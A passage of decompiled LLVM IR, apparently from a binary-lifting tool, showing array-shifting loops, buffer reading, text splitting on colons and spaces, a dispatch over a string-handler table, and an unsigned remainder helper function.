  %tmp64 = icmp slt i32 %v3_c394, 1
  %.pre120 = add i32 %storemerge13102, 1
  br i1 %tmp64, label %dec_label_pc_c4e4, label %dec_label_pc_c3fc.preheader

dec_label_pc_c3fc.preheader:                      ; preds = %dec_label_pc_c36c
  %v2_c40072 = load i32, i32* @global_var_1f4f8.29, align 4
  %v3_c40874 = icmp ult i32 %.pre120, %v2_c40072
  %v3_c41475 = mul i32 %.pre120, 4
  %v2_c42076 = load i32, i32* @global_var_21d84.31, align 4
  %v2_c42477 = add i32 %v2_c42076, %v3_c41475
  %v1_c42878 = add i32 %v2_c42477, -4
  br i1 %v3_c40874, label %dec_label_pc_c3b4, label %dec_label_pc_c410

dec_label_pc_c3b4:                                ; preds = %dec_label_pc_c3fc.preheader, %dec_label_pc_c3b4
  %v1_c42882 = phi i32 [ %v1_c428, %dec_label_pc_c3b4 ], [ %v1_c42878, %dec_label_pc_c3fc.preheader ]
  %v2_c42481 = phi i32 [ %v2_c424, %dec_label_pc_c3b4 ], [ %v2_c42477, %dec_label_pc_c3fc.preheader ]
  %v1_c3a879 = phi i32 [ %v1_c3a8, %dec_label_pc_c3b4 ], [ %.pre120, %dec_label_pc_c3fc.preheader ]
  %v1_c3e8 = inttoptr i32 %v2_c42481 to i32*
  %v2_c3e8 = load i32, i32* %v1_c3e8, align 4
  %v2_c3ec = inttoptr i32 %v1_c42882 to i32*
  store i32 %v2_c3e8, i32* %v2_c3ec, align 4
  %v1_c3a8 = add i32 %v1_c3a879, 1
  %v2_c400 = load i32, i32* @global_var_1f4f8.29, align 4
  %v3_c408 = icmp ult i32 %v1_c3a8, %v2_c400
  %v3_c414 = mul i32 %v1_c3a8, 4
  %v2_c420 = load i32, i32* @global_var_21d84.31, align 4
  %v2_c424 = add i32 %v2_c420, %v3_c414
  %v1_c428 = add i32 %v2_c424, -4
  br i1 %v3_c408, label %dec_label_pc_c3b4, label %dec_label_pc_c3fc.dec_label_pc_c410_crit_edge

dec_label_pc_c3fc.dec_label_pc_c410_crit_edge:    ; preds = %dec_label_pc_c3b4
  br label %dec_label_pc_c410

dec_label_pc_c410:                                ; preds = %dec_label_pc_c3fc.dec_label_pc_c410_crit_edge, %dec_label_pc_c3fc.preheader
  %v1_c428.lcssa = phi i32 [ %v1_c428, %dec_label_pc_c3fc.dec_label_pc_c410_crit_edge ], [ %v1_c42878, %dec_label_pc_c3fc.preheader ]
  %v2_c430 = inttoptr i32 %v1_c428.lcssa to i32*
  store i32 0, i32* %v2_c430, align 4
  %v2_c438 = load i32, i32* @global_var_1f4f8.29, align 4
  %v1_c43c = add i32 %v2_c438, -1
  store i32 %v1_c43c, i32* @global_var_1f4f8.29, align 4
  %v3_c450 = mul i32 %v1_c43c, 4
  %v1_c454 = add i32 %v3_c450, 4
  %v1_c45c = call i32 @function_f908(i32 %v1_c454)
  %v2_c4b886 = load i32, i32* @global_var_1f4f8.29, align 4
  %v3_c4c088 = icmp eq i32 %v2_c4b886, 0
  br i1 %v3_c4c088, label %dec_label_pc_c4c8, label %dec_label_pc_c474

dec_label_pc_c474:                                ; preds = %dec_label_pc_c410, %dec_label_pc_c474
  %storemerge1589 = phi i32 [ %v1_c4ac, %dec_label_pc_c474 ], [ 0, %dec_label_pc_c410 ]
  %v3_c478 = mul i32 %storemerge1589, 4
  %v2_c484 = add i32 %v3_c478, %v1_c45c
  %v2_c498 = load i32, i32* @global_var_21d84.31, align 4
  %v2_c49c = add i32 %v2_c498, %v3_c478
  %v1_c4a0 = inttoptr i32 %v2_c49c to i32*
  %v2_c4a0 = load i32, i32* %v1_c4a0, align 4
  %v2_c4a4 = inttoptr i32 %v2_c484 to i32*
  store i32 %v2_c4a0, i32* %v2_c4a4, align 4
  %v1_c4ac = add i32 %storemerge1589, 1
  %v2_c4b8 = load i32, i32* @global_var_1f4f8.29, align 4
  %v3_c4c0 = icmp ult i32 %v1_c4ac, %v2_c4b8
  br i1 %v3_c4c0, label %dec_label_pc_c474, label %dec_label_pc_c4b4.dec_label_pc_c4c8_crit_edge

dec_label_pc_c4b4.dec_label_pc_c4c8_crit_edge:    ; preds = %dec_label_pc_c474
  br label %dec_label_pc_c4c8

dec_label_pc_c4c8:                                ; preds = %dec_label_pc_c410, %dec_label_pc_c4b4.dec_label_pc_c4c8_crit_edge
  %v2_c4cc = load i32, i32* @global_var_21d84.31, align 4
  %v1_c4d4 = call i32 @function_fa5c(i32 %v2_c4cc)
  store i32 %v1_c45c, i32* @global_var_21d84.31, align 4
  br label %dec_label_pc_c4e4

dec_label_pc_c4e4:                                ; preds = %dec_label_pc_c36c, %dec_label_pc_c4c8
  %v2_c4f4 = load i32, i32* @global_var_1f4f8.29, align 4
  %v3_c4fc = icmp ult i32 %.pre120, %v2_c4f4
  br i1 %v3_c4fc, label %dec_label_pc_c36c, label %dec_label_pc_c504

dec_label_pc_c504:                                ; preds = %dec_label_pc_c4e4, %dec_label_pc_c4f0.preheader
  %v2_c508 = load i32, i32* @global_var_21c70.25, align 4
  %v3_c50c = udiv i32 %v2_c508, 32
  %v3_c518 = mul nuw nsw i32 %v3_c50c, 4
  %v2_c520 = add i32 %v3_c518, %v16_c098
  %v2_c524 = add i32 %v2_c520, -436
  %v1_c528 = inttoptr i32 %v2_c524 to i32*
  %v2_c528 = load i32, i32* %v1_c528, align 4
  %v1_c534 = urem i32 %v2_c508, 32
  %v6_c5382 = lshr i32 %v2_c528, %v1_c534
  %v1_c540 = urem i32 %v6_c5382, 2
  %v2_c544 = icmp eq i32 %v1_c540, 0
  br i1 %v2_c544, label %dec_label_pc_c290.lr.ph, label %dec_label_pc_c54c

dec_label_pc_c54c:                                ; preds = %dec_label_pc_c504
  %v5_c570 = call i32 @function_f84c(i32 %v2_c508, i32* nonnull %stack_var_-6600, i32 4096, i32 0)
  %tmp65 = icmp slt i32 %v5_c570, 1
  br i1 %tmp65, label %dec_label_pc_c23c, label %dec_label_pc_c588

dec_label_pc_c588:                                ; preds = %dec_label_pc_c54c
  %v2_c59c = add i32 %v2_c598, %v5_c570
  %v3_c59c = inttoptr i32 %v2_c59c to i8*
  store i8 0, i8* %v3_c59c, align 1
  store i32 %v2_c55c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_15a00.256 to i32), i32* @r1, align 4
  %v6_c5bc = call i32 @function_f1a0(i32 %v2_c55c, i32 ptrtoint (i32* @global_var_15a00.256 to i32), i32 %v2_c59c, i32 %v2_c55c, i32 %v5_c570)
  %v2_c80828 = icmp eq i32 %v6_c5bc, 0
  br i1 %v2_c80828, label %dec_label_pc_c290.lr.ph, label %dec_label_pc_c810

dec_label_pc_c5cc:                                ; preds = %dec_label_pc_c810
  %v2_c5d0 = call i32 @function_85f8(i32 %storemerge30.in)
  %v2_c5d8 = load i8, i8* %storemerge30, align 1
  %v7_c5dc = icmp eq i8 %v2_c5d8, 58
  br i1 %v7_c5dc, label %dec_label_pc_c5fc, label %dec_label_pc_c688

dec_label_pc_c5f0:                                ; preds = %dec_label_pc_c614
  %v1_c5f4 = add i32 %storemerge20, 1
  br label %dec_label_pc_c5fc

dec_label_pc_c5fc:                                ; preds = %dec_label_pc_c5cc, %dec_label_pc_c5f0
  %storemerge20 = phi i32 [ %v1_c5f4, %dec_label_pc_c5f0 ], [ 0, %dec_label_pc_c5cc ]
  store i32 %storemerge30.in, i32* @r0, align 4
  %v0_c604 = call i32 @function_ecc0()
  %v3_c60c = icmp ult i32 %storemerge20, %v0_c604
  br i1 %v3_c60c, label %dec_label_pc_c614, label %dec_label_pc_c5fc.dec_label_pc_c630_crit_edge

dec_label_pc_c5fc.dec_label_pc_c630_crit_edge:    ; preds = %dec_label_pc_c5fc
  %.pre = add i32 %storemerge20, %storemerge30.in
  %.pre31 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_c630

dec_label_pc_c614:                                ; preds = %dec_label_pc_c5fc
  %v2_c620 = add i32 %storemerge20, %storemerge30.in
  %v1_c624 = inttoptr i32 %v2_c620 to i8*
  %v2_c624 = load i8, i8* %v1_c624, align 1
  %v7_c628 = icmp eq i8 %v2_c624, 32
  br i1 %v7_c628, label %dec_label_pc_c630, label %dec_label_pc_c5f0

dec_label_pc_c630:                                ; preds = %dec_label_pc_c614, %dec_label_pc_c5fc.dec_label_pc_c630_crit_edge
  %v3_c644.pre-phi = phi i8* [ %.pre31, %dec_label_pc_c5fc.dec_label_pc_c630_crit_edge ], [ %v1_c624, %dec_label_pc_c614 ]
  %v2_c63c.pre-phi = phi i32 [ %.pre, %dec_label_pc_c5fc.dec_label_pc_c630_crit_edge ], [ %v2_c620, %dec_label_pc_c614 ]
  store i8 0, i8* %v3_c644.pre-phi, align 1
  %v1_c64c = add i32 %storemerge30.in, 1
  %v2_c660 = inttoptr i32 %v1_c64c to i8*
  %v3_c660 = call i32 @function_ed20(i32 %v2_c654, i8* %v2_c660)
  %v1_c674 = add i32 %v2_c63c.pre-phi, 1
  %v3_c680 = inttoptr i32 %v1_c674 to i8*
  %v4_c680 = call i32 @function_ed20(i32 %storemerge30.in, i8* %v3_c680)
  br label %dec_label_pc_c6b8

dec_label_pc_c688:                                ; preds = %dec_label_pc_c5cc
  store i32 42, i32* %stack_var_-2504, align 4
  br label %dec_label_pc_c6b8

dec_label_pc_c6ac:                                ; preds = %dec_label_pc_c6d0
  %v1_c6b0 = add i32 %storemerge17, 1
  br label %dec_label_pc_c6b8

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c688, %dec_label_pc_c630, %dec_label_pc_c6ac
  %storemerge17 = phi i32 [ %v1_c6b0, %dec_label_pc_c6ac ], [ 0, %dec_label_pc_c630 ], [ 0, %dec_label_pc_c688 ]
  store i32 %storemerge17, i32* @r4, align 4
  store i32 %storemerge30.in, i32* @r0, align 4
  %v0_c6c0 = call i32 @function_ecc0()
  %v0_c6c8 = load i32, i32* @r4, align 4
  %v3_c6c8 = icmp ult i32 %v0_c6c8, %v0_c6c0
  br i1 %v3_c6c8, label %dec_label_pc_c6d0, label %dec_label_pc_c6b8.dec_label_pc_c6ec_crit_edge

dec_label_pc_c6b8.dec_label_pc_c6ec_crit_edge:    ; preds = %dec_label_pc_c6b8
  %.pre32 = add i32 %storemerge17, %storemerge30.in
  %.pre33 = inttoptr i32 %.pre32 to i8*
  br label %dec_label_pc_c6ec

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c6b8
  %v2_c6dc = add i32 %storemerge17, %storemerge30.in
  %v1_c6e0 = inttoptr i32 %v2_c6dc to i8*
  %v2_c6e0 = load i8, i8* %v1_c6e0, align 1
  %v7_c6e4 = icmp eq i8 %v2_c6e0, 32
  br i1 %v7_c6e4, label %dec_label_pc_c6ec, label %dec_label_pc_c6ac

dec_label_pc_c6ec:                                ; preds = %dec_label_pc_c6d0, %dec_label_pc_c6b8.dec_label_pc_c6ec_crit_edge
  %v3_c700.pre-phi = phi i8* [ %.pre33, %dec_label_pc_c6b8.dec_label_pc_c6ec_crit_edge ], [ %v1_c6e0, %dec_label_pc_c6d0 ]
  %v2_c6f8.pre-phi = phi i32 [ %.pre32, %dec_label_pc_c6b8.dec_label_pc_c6ec_crit_edge ], [ %v2_c6dc, %dec_label_pc_c6d0 ]
  store i8 0, i8* %v3_c700.pre-phi, align 1
  %v4_c714 = call i32 @function_ed20(i32 %v2_c708, i8* %storemerge30)
  %v1_c728 = add i32 %v2_c6f8.pre-phi, 1
  %v3_c734 = inttoptr i32 %v1_c728 to i8*
  %v4_c734 = call i32 @function_ed20(i32 %storemerge30.in, i8* %v3_c734)
  %v8_c7c4103 = load i32, i32* bitcast ([4 x i8]** @global_var_1f128.259 to i32*), align 4
  %v2_c7c8105 = icmp eq i32 %v8_c7c4103, 0
  br i1 %v2_c7c8105, label %dec_label_pc_c7d0, label %dec_label_pc_c744

dec_label_pc_c744:                                ; preds = %dec_label_pc_c6ec, %dec_label_pc_c744
  %v7_c7c4108 = phi i32* [ %v7_c7c4, %dec_label_pc_c744 ], [ bitcast ([4 x i8]** @global_var_1f128.259 to i32*), %dec_label_pc_c6ec ]
  %storemerge18106 = phi i32 [ %v1_c7b4, %dec_label_pc_c744 ], [ 0, %dec_label_pc_c6ec ]
  %v7_c74c = load i32, i32* %v7_c7c4108, align 4
  %v2_c760 = inttoptr i32 %v7_c74c to i8*
  %v3_c760 = call i32 @function_f0f4(i8* %v2_c760, i32 %v2_c708)
  %v3_c77c = mul i32 %storemerge18106, 8
  %v2_c784 = add i32 %v3_c77c, add (i32 ptrtoint ([4 x i8]** @global_var_1f128.259 to i32), i32 4)
  %v1_c788 = inttoptr i32 %v2_c784 to i32*
  %v2_c788 = load i32, i32* %v1_c788, align 4
  store i32 %v2_c788, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v2_c788)
  %v1_c7b4 = add i32 %storemerge18106, 1
  %v5_c7c4 = mul i32 %v1_c7b4, 8
  %v6_c7c4 = add i32 %v5_c7c4, ptrtoint ([4 x i8]** @global_var_1f128.259 to i32)
  %v7_c7c4 = inttoptr i32 %v6_c7c4 to i32*
  %v8_c7c4 = load i32, i32* %v7_c7c4, align 4
  %v2_c7c8 = icmp eq i32 %v8_c7c4, 0
  br i1 %v2_c7c8, label %dec_label_pc_c7d0, label %dec_label_pc_c744

dec_label_pc_c7d0:                                ; preds = %dec_label_pc_c744, %dec_label_pc_c6ec
  %v4_c7e0 = call i32 @function_f0f4(i8* %v3_c7e0, i32 ptrtoint ([6 x i8]* @global_var_15a04.261 to i32))
  %v2_c7e8 = icmp eq i32 %v4_c7e0, 0
  br i1 %v2_c7e8, label %dec_label_pc_c23c, label %dec_label_pc_c7f0

dec_label_pc_c7f0:                                ; preds = %dec_label_pc_c7d0
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_15a00.256 to i32), i32* @r1, align 4
  %v6_c7f8 = call i32 @function_f1a0(i32 0, i32 ptrtoint (i32* @global_var_15a00.256 to i32), i32 ptrtoint ([4 x i8]** @global_var_1f128.259 to i32), i32 %v4_c7e0, i32 ptrtoint (i32* @0 to i32))
  %v2_c808 = icmp eq i32 %v6_c7f8, 0
  br i1 %v2_c808, label %dec_label_pc_c290.lr.ph, label %dec_label_pc_c810

dec_label_pc_c810:                                ; preds = %dec_label_pc_c588, %dec_label_pc_c7f0
  %storemerge30.in = phi i32 [ %v6_c7f8, %dec_label_pc_c7f0 ], [ %v6_c5bc, %dec_label_pc_c588 ]
  %storemerge30 = inttoptr i32 %storemerge30.in to i8*
  %v2_c814 = load i8, i8* %storemerge30, align 1
  %v2_c818 = icmp eq i8 %v2_c814, 0
  br i1 %v2_c818, label %dec_label_pc_c290.lr.ph, label %dec_label_pc_c5cc

; uselistorder directives
  uselistorder i8* %storemerge30, { 2, 1, 0 }
  uselistorder i32 %storemerge30.in, { 10, 9, 6, 3, 2, 5, 4, 8, 1, 0, 7 }
  uselistorder i32* %v7_c7c4, { 1, 0 }
  uselistorder i32 %v1_c7b4, { 1, 0 }
  uselistorder i32 %storemerge18106, { 1, 0 }
  uselistorder i32 %.pre32, { 1, 0 }
  uselistorder i32 %storemerge17, { 1, 0, 3, 2 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge20, { 2, 1, 0, 3 }
  uselistorder i32 %v5_c570, { 1, 0, 2 }
  uselistorder i32 %v2_c508, { 2, 1, 0 }
  uselistorder i32 %v1_c4ac, { 1, 0 }
  uselistorder i32 %v3_c478, { 1, 0 }
  uselistorder i32 %storemerge1589, { 1, 0 }
  uselistorder i32 %v1_c45c, { 1, 0 }
  uselistorder i32 %v1_c428, { 1, 0 }
  uselistorder i32 %v2_c424, { 1, 0 }
  uselistorder i32 %v1_c3a8, { 0, 2, 1 }
  uselistorder i32 %v1_c42878, { 1, 0 }
  uselistorder i32 %.pre120, { 1, 4, 0, 3, 2 }
  uselistorder i32 %storemerge13102, { 1, 0 }
  uselistorder i32 %v2_c2bc, { 1, 0 }
  uselistorder i32 %storemerge1225, { 1, 0 }
  uselistorder i32 %v2_c55c, { 0, 2, 1 }
  uselistorder i32 %v2_c27c, { 1, 0 }
  uselistorder i32 %storemerge11, { 2, 0, 1 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_1f128.259 to i32), { 1, 2, 0 }
  uselistorder [4 x i8]** @global_var_1f128.259, { 1, 0 }
  uselistorder i32 (i32)* @function_85f8, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_f1a0, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_15a00.256 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_21d84.31, { 1, 3, 4, 5, 0, 6, 2, 7, 8 }
  uselistorder i32* @global_var_1f4f8.29, { 6, 7, 1, 4, 8, 9, 2, 0, 10, 3, 5, 11 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_cb44, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8374, { 39, 37, 36, 35, 34, 33, 32, 31, 30, 29, 10, 9, 8, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 7, 6, 5, 4, 3, 2, 1, 38, 0 }
  uselistorder i32* @global_var_21c70.25, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 1, 13, 14 }
  uselistorder i32* @global_var_21d78.142, { 0, 1, 4, 2, 5, 6, 7, 3 }
  uselistorder i32* @global_var_21c68.41, { 1, 0 }
  uselistorder i32* @global_var_21c6c.187, { 3, 0, 1, 4, 5, 2, 6, 7, 8, 9 }
  uselistorder i32 ()* @function_8688, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_fff4, { 1, 0 }
  uselistorder i32 (i32)* @function_ca44, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c810, { 1, 0 }
  uselistorder label %dec_label_pc_c744, { 1, 0 }
  uselistorder label %dec_label_pc_c6b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c5fc, { 1, 0 }
  uselistorder label %dec_label_pc_c4e4, { 1, 0 }
  uselistorder label %dec_label_pc_c4c8, { 1, 0 }
  uselistorder label %dec_label_pc_c474, { 1, 0 }
  uselistorder label %dec_label_pc_c3b4, { 1, 0 }
  uselistorder label %dec_label_pc_c290, { 1, 0 }
  uselistorder label %dec_label_pc_c290.lr.ph, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_c23c, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_c19c, { 1, 0 }
  uselistorder label %dec_label_pc_c0dc, { 1, 0 }
}

define i32 @function_c864(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c864:
  store i32 %arg1, i32* @r0, align 4
  %v1_c864 = add i32 %arg2, -1
  %v2_c864 = icmp eq i32 %arg2, 0
  br i1 %v2_c864, label %dec_label_pc_c920, label %dec_label_pc_c86c

dec_label_pc_c86c:                                ; preds = %dec_label_pc_c864
  %v7_c864 = icmp eq i32 %arg2, 1
  br i1 %v7_c864, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_c86c
  %v1_c86c = load i32, i32* @r0, align 4
  %v10_c86c = icmp eq i32 %v1_c86c, %arg2
  br i1 %v10_c86c, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_c86c, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_c86c = icmp ult i32 %v1_c86c, %arg2
  br i1 %v4_c86c, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_c874 = and i32 %v1_c864, %arg2
  %v8_c874 = icmp eq i32 %v6_c874, 0
  br i1 %v8_c874, label %.thread67, label %dec_label_pc_c884.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_c878 = phi i32 [ %v1_c86c, %bb75 ], [ 0, %.thread65 ]
  %v3_c878 = and i32 %v1_c878, %v1_c864
  br label %bb76

dec_label_pc_c884.preheader:                      ; preds = %bb75
  %v2_c88499 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_c88499, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_c914, %bb74, %bb89, %bb84, %dec_label_pc_c8e4, %.thread67
  %v5_c87c = phi i32 [ %v1_c86c, %bb74 ], [ %v3_c878, %.thread67 ], [ %v1_c8c0.v6_c8c0.v6_c8c8.v6_c8d0, %dec_label_pc_c8e4 ], [ 0, %bb84 ], [ %v1_c918, %dec_label_pc_c914 ], [ %v2_c914, %bb89 ]
  ret i32 %v5_c87c

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_c884.preheader
  %v0_c898.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_c884.preheader ], [ %v4_c88c, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_c884.preheader ], [ %v2_c89011, %.thread1.thread9 ]
  br label %dec_label_pc_c898thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_c884.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_c89011, %.thread1.thread9 ], [ 0, %dec_label_pc_c884.preheader ]
  %v0_c898.pr33100 = phi i32 [ %v4_c88c, %.thread1.thread9 ], [ %arg2, %dec_label_pc_c884.preheader ]
  %v4_c888 = icmp ult i32 %v0_c898.pr33100, %v1_c86c
  br i1 %v4_c888, label %bb78, label %dec_label_pc_c898thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_c88c = and i32 %v0_c898.pr33100, 268435456
  %v3_c88c = icmp eq i32 %v2_c88c, 0
  %v4_c88c = mul i32 %v0_c898.pr33100, 16
  br i1 %v3_c88c, label %.thread1.thread9, label %dec_label_pc_c898.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_c89011 = add i32 %storemerge101, 4
  %v2_c884 = icmp ugt i32 %v4_c88c, 268435455
  br i1 %v2_c884, label %.thread, label %bb77

dec_label_pc_c898thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_c898thread-pre-split.loopexit

dec_label_pc_c898thread-pre-split.loopexit:       ; preds = %dec_label_pc_c898thread-pre-split.loopexit.loopexit, %.thread
  %v0_c898.pr3398 = phi i32 [ %v0_c898.pr33.lcssa, %.thread ], [ %v0_c898.pr33100, %dec_label_pc_c898thread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_c898thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_c898thread-pre-split

dec_label_pc_c898thread-pre-split:                ; preds = %.thread4, %dec_label_pc_c898thread-pre-split.loopexit
  %v1_c8a439 = phi i32 [ %storemerge95, %dec_label_pc_c898thread-pre-split.loopexit ], [ %v2_c8a4, %.thread4 ]
  %v0_c898.pr = phi i32 [ %v0_c898.pr3398, %dec_label_pc_c898thread-pre-split.loopexit ], [ %v3_c8a0, %.thread4 ]
  br label %dec_label_pc_c898

dec_label_pc_c898.loopexit:                       ; preds = %bb78
  br label %dec_label_pc_c898

dec_label_pc_c898:                                ; preds = %dec_label_pc_c898.loopexit, %dec_label_pc_c898thread-pre-split
  %v0_c8ac.pr = phi i32 [ %v1_c8a439, %dec_label_pc_c898thread-pre-split ], [ %storemerge101, %dec_label_pc_c898.loopexit ]
  %v1_c8a0 = phi i32 [ %v0_c898.pr, %dec_label_pc_c898thread-pre-split ], [ %v4_c88c, %dec_label_pc_c898.loopexit ]
  %v2_c898 = icmp slt i32 %v1_c8a0, 0
  br i1 %v2_c898, label %dec_label_pc_c8ac, label %bb79

bb79:                                             ; preds = %dec_label_pc_c898
  %v4_c89c = icmp ult i32 %v1_c8a0, %v1_c86c
  br i1 %v4_c89c, label %.thread4, label %dec_label_pc_c8ac

.thread4:                                         ; preds = %bb79
  %v3_c8a0 = mul i32 %v1_c8a0, 2
  %v2_c8a4 = add i32 %v0_c8ac.pr, 1
  br label %dec_label_pc_c898thread-pre-split

dec_label_pc_c8ac:                                ; preds = %bb79, %dec_label_pc_c898
  %v2_c8ac = add i32 %v0_c8ac.pr, -3
  %v5_c8b0 = icmp slt i32 %v0_c8ac.pr, 3
  br i1 %v5_c8b0, label %dec_label_pc_c8f0, label %dec_label_pc_c8b4

dec_label_pc_c8b4:                                ; preds = %dec_label_pc_c8ac, %bb83
  %v6_c8dc = phi i32 [ %v0_c8e4, %bb83 ], [ %v2_c8ac, %dec_label_pc_c8ac ]
  %v1_c8b8 = phi i32 [ %v1_c8c0.v6_c8c0.v6_c8c8.v6_c8d0, %bb83 ], [ %v1_c86c, %dec_label_pc_c8ac ]
  %v3_c8d812 = phi i32 [ %v3_c8d8, %bb83 ], [ %v1_c8a0, %dec_label_pc_c8ac ]
  %v3_c8b4 = icmp ult i32 %v1_c8b8, %v3_c8d812
  %v3_c8b8 = select i1 %v3_c8b4, i32 0, i32 %v3_c8d812
  %v1_c8c0 = sub i32 %v1_c8b8, %v3_c8b8
  %v4_c8bc = udiv i32 %v3_c8d812, 2
  %v6_c8bc = icmp ult i32 %v1_c8c0, %v4_c8bc
  %v6_c8c0 = select i1 %v6_c8bc, i32 0, i32 %v4_c8bc
  %v1_c8c0.v6_c8c0 = sub i32 %v1_c8c0, %v6_c8c0
  %.demorgan = and i1 %v3_c8b4, %v6_c8bc
  %v4_c8c4 = udiv i32 %v3_c8d812, 4
  %v6_c8c4 = icmp ult i32 %v1_c8c0.v6_c8c0, %v4_c8c4
  %v6_c8c8 = select i1 %v6_c8c4, i32 0, i32 %v4_c8c4
  %v1_c8c0.v6_c8c0.v6_c8c8 = sub i32 %v1_c8c0.v6_c8c0, %v6_c8c8
  %.demorgan71 = and i1 %.demorgan, %v6_c8c4
  %v4_c8cc = udiv i32 %v3_c8d812, 8
  %v6_c8cc = icmp ult i32 %v1_c8c0.v6_c8c0.v6_c8c8, %v4_c8cc
  %v6_c8d0 = select i1 %v6_c8cc, i32 0, i32 %v4_c8cc
  %v1_c8c0.v6_c8c0.v6_c8c8.v6_c8d0 = sub i32 %v1_c8c0.v6_c8c0.v6_c8c8, %v6_c8d0
  %.demorgan72 = and i1 %.demorgan71, %v6_c8cc
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_c8b4
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_c8b4, %bb80
  %v2_c8d4 = add i32 %v1_c8c0.v6_c8c0.v6_c8c8.v6_c8d0, -1
  %v4_c8d4 = sub i32 0, %v1_c8c0.v6_c8c0.v6_c8c8.v6_c8d0
  %v5_c8d4 = and i32 %v1_c8c0.v6_c8c0.v6_c8c8.v6_c8d0, %v4_c8d4
  %v3_c8d8 = udiv i32 %v3_c8d812, 16
  %v5_c8dc = icmp slt i32 %v1_c8c0.v6_c8c0.v6_c8c8.v6_c8d0, 1
  br i1 %v5_c8dc, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_c8dc = add i32 %v6_c8dc, -4
  %v9_c8dc = sub i32 3, %v6_c8dc
  %v10_c8dc = and i32 %v9_c8dc, %v6_c8dc
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_c8e4 = phi i32 [ %v6_c8dc, %bb81 ], [ %v7_c8dc, %bb82 ]
  %v0_c8e015.in = phi i32 [ %v2_c8d4, %bb81 ], [ %v7_c8dc, %bb82 ]
  %v1_c8e014.in = phi i32 [ %v5_c8d4, %bb81 ], [ %v10_c8dc, %bb82 ]
  %v1_c8e014 = icmp slt i32 %v1_c8e014.in, 0
  %v0_c8e015 = icmp slt i32 %v0_c8e015.in, 0
  %v2_c8e0 = xor i1 %v0_c8e015, %v1_c8e014
  br i1 %v2_c8e0, label %dec_label_pc_c8e4, label %dec_label_pc_c8b4

dec_label_pc_c8e4:                                ; preds = %bb83
  %v1_c8e4 = urem i32 %v0_c8e4, 4
  %v2_c8e4 = icmp eq i32 %v1_c8e4, 0
  br i1 %v2_c8e4, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_c8e4
  %v3_c8e8 = icmp eq i32 %v1_c8c0.v6_c8c0.v6_c8c8.v6_c8d0, 0
  br i1 %v3_c8e8, label %bb76, label %dec_label_pc_c8f0

dec_label_pc_c8f0:                                ; preds = %bb84, %dec_label_pc_c8ac
  %v0_c904 = phi i32 [ %v3_c8d8, %bb84 ], [ %v1_c8a0, %dec_label_pc_c8ac ]
  %v1_c900 = phi i32 [ %v1_c8c0.v6_c8c0.v6_c8c8.v6_c8d0, %bb84 ], [ %v1_c86c, %dec_label_pc_c8ac ]
  %v0_c8f0 = phi i32 [ %v0_c8e4, %bb84 ], [ %v2_c8ac, %dec_label_pc_c8ac ]
  %v5_c8f4 = icmp slt i32 %v0_c8f0, -2
  br i1 %v5_c8f4, label %dec_label_pc_c914, label %dec_label_pc_c8f8

dec_label_pc_c8f8:                                ; preds = %dec_label_pc_c8f0
  %v8_c8f0 = icmp eq i32 %v0_c8f0, -2
  br i1 %v8_c8f0, label %dec_label_pc_c908, label %dec_label_pc_c8fc

dec_label_pc_c8fc:                                ; preds = %dec_label_pc_c8f8
  %v3_c8fc = icmp ult i32 %v1_c900, %v0_c904
  br i1 %v3_c8fc, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_c8fc
  %v2_c8fc = sub i32 %v1_c900, %v0_c904
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_c8fc, %bb85
  %v0_c90852 = phi i32 [ %v1_c900, %dec_label_pc_c8fc ], [ %v2_c8fc, %bb85 ]
  %v3_c904 = udiv i32 %v0_c904, 2
  br label %dec_label_pc_c908

dec_label_pc_c908:                                ; preds = %dec_label_pc_c8f8, %bb86
